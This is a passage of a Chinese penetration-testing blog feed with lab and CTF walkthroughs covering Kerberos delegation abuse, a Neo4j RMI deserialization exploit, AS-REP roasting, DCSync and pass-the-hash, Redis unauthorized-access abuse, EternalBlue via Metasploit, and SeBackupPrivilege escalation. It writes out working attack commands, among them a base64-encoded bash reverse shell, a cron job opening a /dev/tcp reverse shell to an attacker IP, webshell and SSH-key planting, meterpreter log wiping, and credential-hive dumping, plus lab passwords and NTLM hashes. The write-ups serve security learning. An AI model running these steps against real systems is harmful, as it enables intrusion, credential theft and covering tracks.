-<span class="hljs-keyword">b</span> <span class="hljs-string">&quot;DC=redteam,DC=club&quot;</span> -<span class="hljs-keyword">f</span> <span class="hljs-comment">&quot;(&amp;(samAccountType=805306368)</span><br>(userAccountContro<span class="hljs-variable">l:1</span>.<span class="hljs-number">2.840</span>.<span class="hljs-number">113556.1</span>.<span class="hljs-number">4.803</span>:=<span class="hljs-number">524288</span>))<span class="hljs-comment">&quot; cn distinguishedName</span><br></code></pre></td></tr></table></figure><p>诱导管理员来访问是比较困难的，还可以利用Spooler打印机服务让DC主动连接被控的服务，从而拿到域管理员的TGT，从而dcsync拿哈希接管整个域</p><p>8.约束委派攻击：相比于约束委派，严格限制了服务账号可以代表用户访问的服务，这种限制通过 AD 账号的 msDS-AllowedToDelegateTo 属性实现</p><p>原理:</p><p><img src="/../kerberos%E8%AE%A4%E8%AF%81/f665a3233aac4ab5203126dba08c1c36.png" alt="f665a3233aac4ab5203126dba08c1c36"></p><p>user访问serviceA，向DC发起kerberos认证，域控返回user的TGT和ST1票据，user使用ST1票据对<br>serviceA进行访问如果配置了serviceA到serviceB的约束委派，则serviceA能使用S4U2Proxy协议将用户发给自己的可转发的ST1票据以用户的身份发给DC。域控返回serviceA一个用来访问serviceB的ST2票据,这样serviceA就能以用户的身份对serviceB发起访问</p><p>攻击原理:</p><p>由于服务用户 只能获取某个用户（或主机）的服务的ST1而非TGT ， 所以只能模拟用户访问特定的服务 ，但是如果能拿到约束委派用户（或主机）的密码或者Hash，就可以伪造S4U的请求，伪装成服务用户以任意用户的权限申请访问指定服务的ST2 </p><p><img src="/../kerberos%E8%AE%A4%E8%AF%81/image-20251007193602127.png" alt="image-20251007193602127"></p><p>攻击过程:</p><p>使用命令查询约束用户(即可以被我们恶意访问的服务)</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim">AdFind.<span class="hljs-keyword">exe</span> -<span class="hljs-keyword">b</span> <span class="hljs-string">&quot;DC=redteam,DC=club&quot;</span> -<span class="hljs-keyword">f</span> <span class="hljs-comment">&quot;(&amp;(samAccountType=805306368)(msds-</span><br>allowedtodelegateto=*))<span class="hljs-comment">&quot; cn distinguishedName msds-allowedtodelegateto</span><br></code></pre></td></tr></table></figure><p>然后用服务账号的ntml或者密码去请求tgt</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">tgt:<span class="hljs-function">:ask</span> <span class="hljs-string">/user</span><span class="hljs-function">:websec</span> <span class="hljs-string">/domain</span><span class="hljs-function">:redteam.club</span> <span class="hljs-string">/NTLM</span><span class="hljs-function">:XXXXX</span><br></code></pre></td></tr></table></figure><p>再利用tgt去伪造S4U请求代域管用户发起访问的请求获取st(这一步是利用kekeo或者Rubeus工具实现)</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs swift">tgs::s4u <span class="hljs-operator">/</span>tgt:<span class="hljs-type">TGT_websec</span><span class="hljs-meta">@REDTEAM</span>.<span class="hljs-type">CLUB_krbtgt</span><span class="hljs-operator">~</span>redteam.club<span class="hljs-meta">@REDTEAM</span>.<span class="hljs-type">CLUB</span>.kirbi<br><span class="hljs-regexp">/user:Administrator@reteam.club /</span>service:cifs<span class="hljs-operator">/</span>ad1.redteam.club<br></code></pre></td></tr></table></figure><p>最后把st导入内存就可以访问该服务了</p><p>基于资源的约束委派:</p><p>与传统的约束委派相比，它不再需要域管理员权限去设置相关属性。RBCD把设置委派的权限赋予了机器自身，既机器自己可以决定谁可以被委派来控制我，所以一般自己创造一个完全可控的机器用户，再去打约束委派</p><p>GenericWrite，具有这个权限就可以自己配置可控机器用户到目标用户的委派。</p><p><a href="https://xz.aliyun.com/news/13854">内网渗透-委派攻击详解-先知社区</a></p>]]></content>
    
    
    <categories>
      
      <category>渗透</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>春秋云镜之time</title>
    <link href="/2025/09/24/%E6%B8%97%E9%80%8F/Time/"/>
    <url>/2025/09/24/%E6%B8%97%E9%80%8F/Time/</url>
    
    <content type="html"><![CDATA[<h1 id="Time"><a href="#Time" class="headerlink" title="Time"></a>Time</h1><p><img src="/../Time/376f47a9c35f40af923e89d54269546a.png" alt="img"></p><h2 id="入口机漏洞-neo4j的rmi协议的反序列漏洞"><a href="#入口机漏洞-neo4j的rmi协议的反序列漏洞" class="headerlink" title="入口机漏洞: neo4j的rmi协议的反序列漏洞"></a>入口机漏洞: neo4j的rmi协议的反序列漏洞</h2><p>Neo4j 的 Shell Server 在启用时会暴露一个 RMI 服务。攻击者可以利用 Rhino 库中的已知漏洞链，通过构造恶意对象并调用 <em>setSessionVariable</em> 方法，触发反序列化漏洞，执行任意命令。此漏洞不依赖于 Java 版本，因为它并非传统的 RMI 反序列化漏洞。</p><p>在 <strong>Neo4j 3.5 及之后的版本</strong>，Neo4j Shell 被 Cyber Shell 替代，从而修复了该漏洞</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">java -jar rhino_gadget.jar rmi://39.98.119.66:1337 &quot;bash -c </span><span class="hljs-template-variable">&#123;echo,YmFza...MDA3NyAwPiYx&#125;</span><span class="language-xml">|</span><span class="hljs-template-variable">&#123;base64,-d&#125;</span><span class="language-xml">|</span><span class="hljs-template-variable">&#123;bash,-i&#125;</span><span class="language-xml">&quot;</span><br></code></pre></td></tr></table></figure><p>直接弹shell拿flag1，然后传fscan，stowaway，内网渗透，172.22.6.38有一个web服务，sqlmap注入拿flag2，同时发现很多用户</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-code">+----+</span>------------------<span class="hljs-code">+---------------+</span><br><span class="hljs-section">| id | password         | username      |</span><br><span class="hljs-section">+----+------------------+---------------+</span><br><span class="hljs-section">| 1  | bo2y8kAL3HnXUiQo | administrator |</span><br><span class="hljs-section">+----+------------------+---------------+</span><br></code></pre></td></tr></table></figure><p>在思考能不能试试登录这个然后甜土豆提权到system，然后再用猕猴桃抓取</p><p><img src="/../Time/image-20250924002333323.png" alt="image-20250924002333323"></p><h2 id="AS-REP-Roasting攻击"><a href="#AS-REP-Roasting攻击" class="headerlink" title="AS-REP Roasting攻击"></a>AS-REP Roasting攻击</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理:"></a>原理:</h3><p><img src="/../Time/image-20250924003259018.png" alt="image-20250924003259018"></p><h4 id="1-Kerberos-认证的-“预身份验证”-机制"><a href="#1-Kerberos-认证的-“预身份验证”-机制" class="headerlink" title="1. Kerberos 认证的 “预身份验证” 机制"></a>1. Kerberos 认证的 “预身份验证” 机制</h4><p>Kerberos 认证的第一步是<strong>向域控制器的 “认证服务（AS）” 请求票据授予票（TGT）</strong>。为了防止攻击者 “盲猜” 用户名并请求 TGT，Kerberos 设计了<strong>预身份验证（Pre-Authentication）</strong>：用户必须先通过自己的凭据（如 NTLM 哈希）向 AS “证明身份”，AS 才会响应 TGT 请求。这相当于 “先验明正身，再给票据”，能有效阻止无差别请求。</p><h4 id="2-AS-REP-Roasting-的攻击逻辑"><a href="#2-AS-REP-Roasting-的攻击逻辑" class="headerlink" title="2. AS_REP Roasting 的攻击逻辑"></a>2. AS_REP Roasting 的攻击逻辑</h4><p>当某个<strong>域用户的 “不需要 Kerberos 预身份验证” 选项被开启</strong>（即 “预身份验证被禁用”）时，攻击可发生：</p><ul><li>攻击者无需证明自己是目标用户，可<strong>伪造任意用户名</strong>，直接向 AS 请求该用户的 TGT。</li><li>AS 收到请求后，因目标用户 “免预验证”，会返回<strong>AS_REP（认证服务响应）</strong>。这个 AS_REP 中，包含了<strong>用目标用户 NTLM 哈希加密的内容</strong>（比如会话密钥）。</li><li>攻击者拿到 AS_REP 后，可对其中 “用用户哈希加密的部分” 进行<strong>暴力破解</strong>（用 Hashcat、John 等工具），尝试还原出用户的 NTLM 哈希（甚至明文密码）。若破解成功，就能获取该用户的凭据，用于后续渗透。</li></ul><h3 id="步骤："><a href="#步骤：" class="headerlink" title="步骤："></a>步骤：</h3><h4 id="验证真实有效的用户"><a href="#验证真实有效的用户" class="headerlink" title="验证真实有效的用户"></a>验证真实有效的用户</h4><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">kerbrute_windows_amd64<span class="hljs-selector-class">.exe</span> userenum -d xiaorang<span class="hljs-selector-class">.lab</span> <span class="hljs-attr">--dc</span> <span class="hljs-number">172.22</span>.<span class="hljs-number">6.12</span> user<span class="hljs-selector-class">.txt</span> -t <span class="hljs-number">10</span><br></code></pre></td></tr></table></figure><p>这条命令的目的是：通过<code>kerbrute</code>工具，向<code>xiaorang.lab</code>域的域控制器（<code>172.22.6.12</code>）发送请求，利用<code>user.txt</code>中的用户名列表，枚举该域中真实存在的有效用户账户。</p><h4 id="抓取免预认证的用户响应"><a href="#抓取免预认证的用户响应" class="headerlink" title="抓取免预认证的用户响应"></a>抓取免预认证的用户响应</h4><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">proxychains4</span> python3 GetNPUsers.py -dc-ip <span class="hljs-number">172.22.6.12</span> -usersfile yu_user.txt xiaorang.lab/<br></code></pre></td></tr></table></figure><p>向域控制器发送请求，检测指定用户列表中哪些用户 “禁用了 Kerberos 预认证”，并获取这些用户的<code>AS_REP</code>响应（包含用用户哈希加密的内容），然后用john离线破解hash，得到了两个用户的登录密码。</p><p>登录后，因为是域用户，可以直接上sharpHound收集一下域内的信息。</p><p><img src="/../Time/image-20250924004934358.png" alt="image-20250924004934358"></p><h2 id="SIDHistory的滥用"><a href="#SIDHistory的滥用" class="headerlink" title="SIDHistory的滥用"></a>SIDHistory的滥用</h2><p>发现yuxuan用户非常可疑</p><p>query user查看本机登录用户信息，发现了该用户，然后在注册表找到了该用户的账号密码，rdp登录</p><h4 id="分析"><a href="#分析" class="headerlink" title="分析:"></a>分析:</h4><p>SID（Security Identifier，安全标识符）是 Windows 系统中唯一标识用户、组、计算机等安全主体的 “数字身份证”，系统通过 SID 判断主体的访问权限（而非用户名）。SIDHistory 的设计初衷是<strong>支持跨域迁移时的权限平滑过渡</strong>，避免迁移后用户失去对原域资源的访问权。</p><p><code>YUXUAN</code> 与 <code>ADMINISTRATOR</code> 之间的 <code>HasSidHistory</code> 边，表明 <code>YUXUAN</code> 的 <code>SIDHistory</code> 中被植入了 “管理员 <code>ADMINISTRATOR</code> 的 SID”。根据 Windows 权限验证规则：<strong>系统会同时检查用户的 <code>objectSid</code>（自身 SID）和 <code>SIDHistory</code> 中的所有 SID，只要其中一个 SID 有对应权限，就允许访问</strong>。因此，<code>YUXUAN</code> 会<strong>继承管理员的所有权限</strong>。</p><p>既然yuxuan具有域管的权限，那么直接上次猕猴桃抓取域内所有用户的ntml哈希，其中包括域管的哈希，然后打一个pth的横向移动即可控制所有主机</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">lsadump::dcsync /domain:xiaorang.lab /all /csv <span class="hljs-comment">#Mimikatz 工具中用于从域控制器（DC）同步并导出域内用户凭证信息的命令</span><br></code></pre></td></tr></table></figure><p>这条命令依赖的是域管的权限</p><p><img src="/../Time/9f67b4180323bb300f4fd0357e9b1434.png" alt="9f67b4180323bb300f4fd0357e9b1434"></p><p>这个方法没打通是应该是因为我拿不到这台机子本地管理员的权限</p><h4 id="pth拿flag"><a href="#pth拿flag" class="headerlink" title="pth拿flag"></a>pth拿flag</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">proxychains4</span> impacket-smbexec -hashes :<span class="hljs-number">04</span>d93ffd6f5f6e4490e0de23f240a5e9 xiaorang.lab/administrator@<span class="hljs-number">172.22.6.25</span> -codec gbk<br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">proxychains4</span> impacket-smbexec -hashes :<span class="hljs-number">04</span>d93ffd6f5f6e4490e0de23f240a5e9 xiaorang.lab/administrator@<span class="hljs-number">172.22.6.12</span> -codec gbk<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>渗透</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>redis未授权访问</title>
    <link href="/2025/09/24/%E6%B8%97%E9%80%8F/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"/>
    <url>/2025/09/24/%E6%B8%97%E9%80%8F/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/</url>
    
    <content type="html"><![CDATA[<h1 id="redis未授权访问"><a href="#redis未授权访问" class="headerlink" title="redis未授权访问"></a>redis未授权访问</h1><h2 id="1-redis未授权访问"><a href="#1-redis未授权访问" class="headerlink" title="1.redis未授权访问"></a>1.redis未授权访问</h2><p>Redis 是一个高效的数据库，默认会绑定在 0.0.0.0:6379，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis 服务暴露到公网上，如果在没有设置密码认证（默认为空）的情况下，会导致任意用户在可以访问目标服务器的情况下未经授权就可以访问 Redis 以及读取 Redis 的数据。</p><p>关闭保护后即可任意连接且命令执行</p><p><img src="/../redis%E5%92%8C%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20250926112221644.png" alt="image-20250926112221644"></p><h2 id="2-写入webshell"><a href="#2-写入webshell" class="headerlink" title="2.写入webshell"></a>2.写入webshell</h2><p><img src="/../redis%E5%92%8C%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20250926113044880.png" alt="image-20250926113044880"></p><p>原理是利用redis能自定义其rdb快照文件的保存路径和保存文件名，且内容可写</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">config set dir /var/www/html</span><br><span class="language-xml">config set dbfilename haha.php</span><br><span class="language-xml">set webshell &quot;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>(); <span class="hljs-meta">?&gt;</span></span><span class="language-xml">&quot;</span><br><span class="language-xml">save</span><br></code></pre></td></tr></table></figure><p><img src="/../redis%E5%92%8C%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20250926112607058.png" alt="image-20250926112607058"></p><p><img src="/../redis%E5%92%8C%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20250926112653052.png" alt="image-20250926112653052"></p><p>注意开启redis服务的用户要对web目录有写的权限</p><h2 id="3-写入ssh公钥实现ssh登录"><a href="#3-写入ssh公钥实现ssh登录" class="headerlink" title="3.写入ssh公钥实现ssh登录"></a>3.写入ssh公钥实现ssh登录</h2><p>先生成公钥</p><p><img src="/../redis%E5%92%8C%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20250926113544823.png" alt="image-20250926113544823"></p><p>将公钥写入key.txt，换行是为了防止与其他内容混淆</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /root/.ssh<br>(<span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;\n&quot;</span>;<span class="hljs-built_in">cat</span> id_rsa.pub;<span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;\n&quot;</span>)&gt;key.txt<br><br></code></pre></td></tr></table></figure><p>将key.txt的内容存入到redis的缓冲中</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /root/.ssh/key.txt |./redis-cli -h 192.168.178.128 -x <span class="hljs-built_in">set</span> pub<br></code></pre></td></tr></table></figure><p>利用redis可以任意保存快照文件的机制写入到&#x2F;root&#x2F;.ssh&#x2F;authorized_keys</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros">./redis-cli -h 192.168.178.128<span class="hljs-built_in"></span><br><span class="hljs-built_in">config </span><span class="hljs-built_in">set</span> dir /root/.ssh<span class="hljs-built_in"></span><br><span class="hljs-built_in">config </span><span class="hljs-built_in">set</span> dbfilename authorized_keys<br>save<br></code></pre></td></tr></table></figure><p><img src="/../redis%E5%92%8C%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20250926114119206.png" alt="image-20250926114119206"></p><p>注意的是，redis保存快照的机制只能任意创建文件，不能创建目录，所以操作的前提是目标目录要存在</p><h2 id="4-写入定时任务实现反弹shell"><a href="#4-写入定时任务实现反弹shell" class="headerlink" title="4.写入定时任务实现反弹shell"></a>4.写入定时任务实现反弹shell</h2><p>同样利用任意写入的机制写个反弹shell到cron目录下</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">set</span> xxx <span class="hljs-string">&quot;\n\n*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/192.168.224.129/5555 0&gt;&amp;1\n\n&quot;</span>  # ip改为攻击机的IP<br><span class="hljs-built_in"></span><br><span class="hljs-built_in">config </span><span class="hljs-built_in">set</span> dir /var/spool/cron<br><span class="hljs-built_in"></span><br><span class="hljs-built_in">config </span><span class="hljs-built_in">set</span> dbfilename root<br><br>save<br></code></pre></td></tr></table></figure><p>这里我没成功，因为我用的kali开的redis服务，好像只有centos才行</p><ul><li><p><strong>文件权限差异</strong>：Redis 默认写文件的权限是 644，在 CentOS 系统下，定时任务文件所在的 &#x2F;var&#x2F;spool&#x2F;cron&#x2F; 目录及其子文件对这种权限的兼容性较好，能够正常解析和执行写入的定时任务。而在 Ubuntu 等系统中，定时任务文件可能需要 600 的权限才能正常工作，Redis 写入的文件权限不符合要求，导致定时任务无法被正确解析执行。</p></li><li><p><strong>系统对乱码的处理方式</strong>：当 Redis 向定时任务文件里写入内容时，可能会出现乱码。CentOS 系统会忽略这些乱码，只要定时任务的格式在整体上是正确的，就会执行其中的命令，这使得反弹 shell 命令有机会被执行。而其他一些系统，如 Ubuntu 和 Debian，对定时任务文件的格式要求更为严格，乱码可能会导致语法错误，从而使定时任务无法执行。</p></li></ul><h2 id="5-redis主从复制"><a href="#5-redis主从复制" class="headerlink" title="5.redis主从复制"></a>5.redis主从复制</h2><p>redis主从复制，redis会以一台机子为主节点，多台机子为从节点，其中主节点有写的权限，从节点只有读的权限，且主节点数据的改变会实时同步到从节点。原理就是攻击机作为主节点去连接目标机的redis服务，目标机作为从节点要同步我们在攻击机的数据，从而拿到了shell</p><p><img src="/../redis%E5%92%8C%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/f084fd6a2f0cf16b0dd3b99f21d954a2.png" alt="f084fd6a2f0cf16b0dd3b99f21d954a2"></p><p>成功执行命令</p>]]></content>
    
    
    <categories>
      
      <category>渗透</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>永恒之蓝</title>
    <link href="/2025/09/24/%E6%B8%97%E9%80%8F/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/"/>
    <url>/2025/09/24/%E6%B8%97%E9%80%8F/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/</url>
    
    <content type="html"><![CDATA[<h1 id="永恒之蓝的打法"><a href="#永恒之蓝的打法" class="headerlink" title="永恒之蓝的打法"></a>永恒之蓝的打法</h1><h1 id="msf"><a href="#msf" class="headerlink" title="msf"></a>msf</h1><p>17010</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">proxychains4 msfconsole<br>use exploit/windows/smb/ms17_010_eternalblue  <span class="hljs-comment"># 选择使用的模块</span><br><span class="hljs-built_in">set</span> payload windows/x64/meterpreter/bind_tcp_uuid  <span class="hljs-comment"># 设置payload，可以通过show payloads查看</span><br><span class="hljs-built_in">set</span> RHOSTS 172.22.1.21  <span class="hljs-comment"># 设置靶机的ip</span><br>exploit  <span class="hljs-comment"># 发起攻击</span><br></code></pre></td></tr></table></figure><p>攻击成功之后</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">meterpreter</span> &gt; screenshot <span class="hljs-comment"># 捕获屏幕</span><br>meterpreter &gt; upload hello.txt c:// <span class="hljs-comment">#上传文件</span><br>meterpreter &gt; download d://1.txt <span class="hljs-comment"># 下载文件</span><br>meterpreter &gt; shell <span class="hljs-comment"># 获取cmd</span><br>meterpreter &gt; clearev <span class="hljs-comment"># 清除日志</span><br>meterpreter &gt; hashdump <span class="hljs-comment"># 清除日志</span><br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">load kiwi  <span class="hljs-comment"># 调用mimikatz模块</span><br>kiwi_cmd <span class="hljs-string">&quot;lsadump::dcsync /domain:xiaorang.lab /all /csv&quot;</span> <span class="hljs-keyword">exit</span>  <span class="hljs-comment"># 导出域内所有用户的信息(包括哈希值)</span><br></code></pre></td></tr></table></figure><h1 id="方程式工具"><a href="#方程式工具" class="headerlink" title="方程式工具"></a>方程式工具</h1><p>直接注入dll，然后rdp登录</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">admin01/Config123!@<span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>渗透</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>春秋云境之thermalpower</title>
    <link href="/2025/09/24/%E6%B8%97%E9%80%8F/thermalpower/"/>
    <url>/2025/09/24/%E6%B8%97%E9%80%8F/thermalpower/</url>
    
    <content type="html"><![CDATA[<h1 id="春秋云境之thermalpower"><a href="#春秋云境之thermalpower" class="headerlink" title="春秋云境之thermalpower"></a>春秋云境之thermalpower</h1><h2 id="入口机"><a href="#入口机" class="headerlink" title="入口机"></a>入口机</h2><p>heapdump内存泄露，利用工具解密拿到key，然后打一个shiro反序列化注入内存马拿shell </p><h2 id="SeBackupPrivilege-提权"><a href="#SeBackupPrivilege-提权" class="headerlink" title="SeBackupPrivilege 提权"></a>SeBackupPrivilege 提权</h2><p>SeBackupPrivilege 权限用来实现备份操作，允许文件内容检索，即使文件上的安全描述符可能未授予此类访问权限。</p><p><strong>diskshadow</strong> 是 Windows 的内置功能，可以帮助创建备份。参考 hackingarticles，可以在本地或 DC 进行权限提升。</p><p>Privilege 靶场中也使用该方式实现权限提升。ThermalPower 只涉及本地权限提升，不涉及 DC。</p><p>powershell使用 <a href="https://github.com/gtworek/PSBits/blob/master/Misc/EnableSeBackupPrivilege.ps1">EnableSeBackupPrivilege.ps1</a>启用 SeBackupPrivilege：</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coq"><span class="hljs-keyword">Import</span>-<span class="hljs-keyword">Module</span> .\EnableSeBackupPrivilege.ps1<br></code></pre></td></tr></table></figure><p>新建 s.dsh 文件</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-keyword">set</span> context <span class="hljs-comment">persistent nowriters</span><br>add <span class="hljs-comment">volume c: alias mydrive</span><br>create<br>expose <span class="hljs-comment">%mydrive% z:</span><br></code></pre></td></tr></table></figure><p>如果是linux生成的要转换编码和间距</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">unix2dos</span> s.dsh<br></code></pre></td></tr></table></figure><p>以管理员权限在 PowerShell 中执行命令。当前用户路径权限不够，需要在 C 盘新建目录 Temp，执行 diskshadow 并拷贝 flag02 </p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs livescript">PS C:<span class="hljs-string">\Users\chenhua\Desktop&gt;</span> cd C:<span class="hljs-string">\</span><br>PS C:<span class="hljs-string">\Users\chenhua\Desktop&gt;</span> mkdir Temp<br>PS C:<span class="hljs-string">\Temp&gt;</span> diskshadow /s s.dsh<br>PS C:<span class="hljs-string">\Temp&gt;</span> dir z:<span class="hljs-string">\Users\Administrator\flag\</span><br>PS C:<span class="hljs-string">\Temp&gt;</span> robocopy /b z:<span class="hljs-string">\Users\Administrator\flag\</span> . flag02.txt<br></code></pre></td></tr></table></figure><p>也可以保存注册表来获取本地凭证</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs livescript">mkdir c:<span class="hljs-string">\Tmp</span><br>reg save hklm<span class="hljs-string">\system</span> c:<span class="hljs-string">\Tmp\system</span><br>reg save hklm<span class="hljs-string">\sam</span> c:<span class="hljs-string">\Tmp\sam</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>渗透</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>春秋云镜之Tsclient</title>
    <link href="/2025/08/31/%E6%B8%97%E9%80%8F/Tsclient/"/>
    <url>/2025/08/31/%E6%B8%97%E9%80%8F/Tsclient/</url>
    
    <content type="html"><![CDATA[<h1 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h1><p>先扫一下</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs MATLAB">D:\天狐工具箱\gui_scan\fscan&gt;fscan.exe -h <span class="hljs-number">39.99</span><span class="hljs-number">.153</span><span class="hljs-number">.41</span><br><br>   ___                              _<br>  / _ \     ___  ___ _ __ __ _  ___| | __<br> / /_\/____/ __|/ __| <span class="hljs-string">&#x27;__/ _` |/ __| |/ /</span><br><span class="hljs-string">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;</span><br><span class="hljs-string">\____/     |___/\___|_|  \__,_|\___|_|\_\</span><br><span class="hljs-string">                     fscan version: 2.0.0</span><br><span class="hljs-string">[*] 扫描类型: all, 目标端口: 21,22,80,81,135,139,443,445,1433,1521,3306,5432,6379,7001,8000,8080,8089,9000,9200,11211,27017,80,81,82,83,84,85,86,87,88,89,90,91,92,98,99,443,800,801,808,880,888,889,1000,1010,1080,1081,1082,1099,1118,1888,2008,2020,2100,2375,2379,3000,3008,3128,3505,5555,6080,6648,6868,7000,7001,7002,7003,7004,7005,7007,7008,7070,7071,7074,7078,7080,7088,7200,7680,7687,7688,7777,7890,8000,8001,8002,8003,8004,8006,8008,8009,8010,8011,8012,8016,8018,8020,8028,8030,8038,8042,8044,8046,8048,8053,8060,8069,8070,8080,8081,8082,8083,8084,8085,8086,8087,8088,8089,8090,8091,8092,8093,8094,8095,8096,8097,8098,8099,8100,8101,8108,8118,8161,8172,8180,8181,8200,8222,8244,8258,8280,8288,8300,8360,8443,8448,8484,8800,8834,8838,8848,8858,8868,8879,8880,8881,8888,8899,8983,8989,9000,9001,9002,9008,9010,9043,9060,9080,9081,9082,9083,9084,9085,9086,9087,9088,9089,9090,9091,9092,9093,9094,9095,9096,9097,9098,9099,9100,9200,9443,9448,9800,9981,9986,9988,9998,9999,10000,10001,10002,10004,10008,10010,10250,12018,12443,14000,16080,18000,18001,18002,18004,18008,18080,18082,18088,18090,18098,19001,